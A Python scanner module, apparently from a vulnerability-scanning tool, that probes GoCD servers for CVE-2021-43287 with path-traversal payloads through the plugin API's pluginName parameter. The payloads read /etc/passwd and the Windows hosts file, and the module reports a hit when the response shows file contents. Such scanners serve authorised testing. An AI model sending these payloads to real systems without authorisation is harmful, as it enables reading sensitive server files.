#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2021_43287_payloads = [
    {'path': 'go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../etc/passwd'},
    {'path': 'add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../etc/passwd'},
    {'path': 'business-continuity/api/plugin?folderName=&pluginName=../../../../../../etc/passwd'},
    {'path': 'go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'business-continuity/api/plugin?folderName=&pluginName=../../../../../../C:/Windows/System32/drivers/etc/hosts'},
    # {'path': 'go/add-on/business-continuity/api/plugin?folderName=&pluginName=..\\..\\..\\..\\..\\..\\C:\\Windows\\System32\\drivers\\etc\\hosts'},
]

def cve_2021_43287_scan(clients):
    ''' GoCD plugin API 参数中的pluginName参数存在任意文件读取漏洞
            导致攻击者可以获取服务器中的任意敏感信息
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'GoCD',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2021-43287',
    }
    
    for payload in cve_2021_43287_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
